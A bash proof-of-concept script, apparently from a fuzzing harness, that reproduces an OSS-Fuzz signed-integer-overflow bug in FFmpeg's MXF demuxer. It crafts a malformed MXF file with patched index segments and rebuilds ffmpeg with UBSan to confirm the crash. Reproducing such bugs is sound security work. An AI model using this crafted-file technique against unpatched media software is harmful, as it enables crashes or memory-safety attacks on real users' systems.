#!/bin/bash
# PoC for OSSFUZZ-376496313: signed integer overflow in mxf_edit_unit_absolute_offset()
# (libavformat/mxfdec.c), introduced by 649ac17efd96 ("Speed up
# mxf_edit_unit_absolute_offset()"), fixed by f7cc023f06c4.
#
# The default build in this harness is ASan-only (no UBSan instrumentation),
# so this script recompiles libavformat/mxfdec.c with
# -fsanitize=address,undefined -fno-sanitize-recover=undefined (same source,
# just added instrumentation) and relinks ffmpeg, then crafts a minimal MXF
# file with a 1-frame mpeg2video OP1a essence and a hand-patched IndexSID=2
# index table containing two IndexTableSegments:
#   segment A: IndexStartPosition=0, IndexDuration=2^63+1, 3 IndexEntryArray
#              entries (so nb_index_entries==2*IndexDuration+1 mod 2^64,
#              satisfying the "Avid index" check)
#   segment B: IndexStartPosition=2^64-1 (== -1 signed), IndexDuration=2^63
#              (== INT64_MIN signed)
# Segment B's IndexStartPosition/IndexDuration make
# av_sat_add64(-1, INT64_MIN) saturate to exactly INT64_MIN. The buggy
# post-intro clamp
#   edit_unit = FFMAX(FFMIN(edit_unit, index_end), first_segment->index_start_position);
# then mixes the signed edit_unit with the *unsigned* index_start_position
# field, so FFMAX(INT64_MIN, 0u) keeps the huge-unsigned (i.e. very negative
# signed) INT64_MIN value instead of clamping it back to a sane
# non-negative edit_unit. That negative edit_unit then matches segment A's
# range (index_duration 2^63+1 is huge enough in unsigned terms), giving
# index == INT64_MIN, and "index *= 2;" (mxfdec.c, the Avid-index doubling)
# overflows: UBSan reports
#   "signed integer overflow: -9223372036854775808 * 2 cannot be represented in type 'long'"
# at libavformat/mxfdec.c:1950, in mxf_edit_unit_absolute_offset, called
# from mxf_set_current_edit_unit / mxf_read_packet -- matching the original
# OSS-Fuzz crash state exactly.
#
# In pre_intro (old per-segment-clamped loop) and post_benign (adds
# "if (edit_unit < 0) return AVERROR_PATCHWELCOME;" right after the clamp)
# the same crafted file does not crash.

set -e
cd /work
WORKDIR=$(mktemp -d)
cd "$WORKDIR"

# 1) Build a minimal OP1a MXF file (1 mpeg2video frame -> gives a VBR
#    IndexTableSegment with EditUnitByteCount==0 that we can patch).
/work/ffmpeg -y -threads 1 -f lavfi -i "testsrc=size=16x16:rate=25" \
    -frames:v 1 -c:v mpeg2video -threads 1 -g 1 -bf 0 -f mxf base.mxf \
    >enc.log 2>&1

# 2) Locate the IndexTableSegment KLV and patch/duplicate it into our two
#    malicious segments.
python3 - "$WORKDIR" << 'PYEOF'
import sys
data = open('base.mxf', 'rb').read()
key = bytes.fromhex('060e2b34025301010d01020101100100')
p = data.find(key)
p2 = p + 16
b0 = data[p2]
if b0 & 0x80:
    n = b0 & 0x7f
    length = int.from_bytes(data[p2+1:p2+1+n], 'big')
    hdr_len = 1 + n
else:
    length = b0
    hdr_len = 1
p2 = p + 16 + hdr_len
end = p2 + length
seg_value = bytearray(data[p2:end])

i = 0
tag_offsets = {}
while i < len(seg_value):
    tag = int.from_bytes(seg_value[i:i+2], 'big')
    tlen = int.from_bytes(seg_value[i+2:i+4], 'big')
    tag_offsets[tag] = (i, tlen)
    i += 4 + tlen

def build_segment(start_val, dur_val, target_count=None):
    b = bytearray(seg_value)
    off, l = tag_offsets[0x3f0c]
    b[off+4:off+4+l] = start_val.to_bytes(8, 'big', signed=False)
    off, l = tag_offsets[0x3f0d]
    b[off+4:off+4+l] = dur_val.to_bytes(8, 'big', signed=False)
    if target_count is not None:
        off, l = tag_offsets[0x3f0a]
        arr = b[off+4:off+4+l]
        count = int.from_bytes(arr[0:4], 'big')
        itemlen = int.from_bytes(arr[4:8], 'big')
        entries = arr[8:]
        last_entry = entries[-itemlen:]
        while count < target_count:
            entries = entries + last_entry
            count += 1
        new_arr = count.to_bytes(4, 'big') + itemlen.to_bytes(4, 'big') + entries
        new_tag_header = (0x3f0a).to_bytes(2, 'big') + len(new_arr).to_bytes(2, 'big')
        b = b[:off] + new_tag_header + new_arr + b[off+4+l:]
    return bytes(b)

# segment A: start=0, duration=2**63+1, 3 index entries (Avid check needs
# nb_index_entries == (2*duration+1) mod 2**64 == 3 here)
segLow = build_segment(0, (2**63) + 1, target_count=3)
# segment B: start=2**64-1 (-1 signed), duration=2**63 (INT64_MIN signed)
segHigh = build_segment((2**64) - 1, 2**63, target_count=None)

def make_klv(key16, value):
    l = len(value)
    if l < 128:
        lenbytes = bytes([l])
    else:
        lb = l.to_bytes((l.bit_length() + 7) // 8, 'big')
        lenbytes = bytes([0x80 | len(lb)]) + lb
    return key16 + lenbytes + value

key16 = data[p:p+16]
klvLow = make_klv(key16, segLow)
klvHigh = make_klv(key16, segHigh)

newdata = data[:p] + klvLow + klvHigh + data[end:]
open('poc.mxf', 'wb').write(newdata)
print('wrote poc.mxf', len(newdata), 'bytes')
PYEOF

# 3) The default build here is ASan-only; recompile mxfdec.c with UBSan
#    added (same source, just more instrumentation) and relink ffmpeg so
#    the signed-integer-overflow check actually fires.
cd /work
touch libavformat/mxfdec.c
clang -I. -I./ -D_ISOC11_SOURCE -D_FILE_OFFSET_BITS=64 -D_LARGEFILE_SOURCE \
    -D_POSIX_C_SOURCE=200112 -D_XOPEN_SOURCE=600 -DPIC -I./compat/stdbit \
    -DZLIB_CONST -DHAVE_AV_CONFIG_H -DBUILDING_avformat -g -O0 \
    -fsanitize=address,undefined -fno-sanitize-recover=undefined \
    -fno-omit-frame-pointer -std=c17 -fPIC -pthread -g -Wno-everything \
    -fno-math-errno -fno-signed-zeros -mstack-alignment=16 \
    -Qunused-arguments -c -o libavformat/mxfdec.o libavformat/mxfdec.c
touch libavformat/mxfdec.o
make ffmpeg >/dev/null

# 4) Run it on the crafted file.
UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1 \
    /work/ffmpeg -y -i "$WORKDIR/poc.mxf" -f null - 2>&1
